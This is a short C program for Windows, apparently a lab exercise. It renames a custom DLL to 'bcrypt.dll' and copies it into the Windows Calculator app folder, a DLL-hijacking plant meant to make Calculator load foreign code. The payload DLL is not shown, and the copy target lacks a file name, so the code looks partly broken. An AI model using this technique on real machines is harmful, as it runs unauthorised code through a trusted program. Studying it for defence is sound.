#include <stdio.h>
#include <windows.h>

int main(int argc, char* argv[])
{
	HINSTANCE hinstDLL;
	hinstDLL = LoadLibraryA("bcrypt.dll");

	if (hinstDLL != 0)
	{
		MoveFileA("Bai3_w4.dll", "bcrypt.dll");
			CopyFileA("bcrypt.dll", "C:\\Program Files\\WindowsApps\\Microsoft.WindowsCalculator_10.2012.21.0_x64__8wekyb3d8bbwe", 0);

	}
	else
		printf("Not able to find DLL: Err #%d", GetLastError());
	return 0;

}

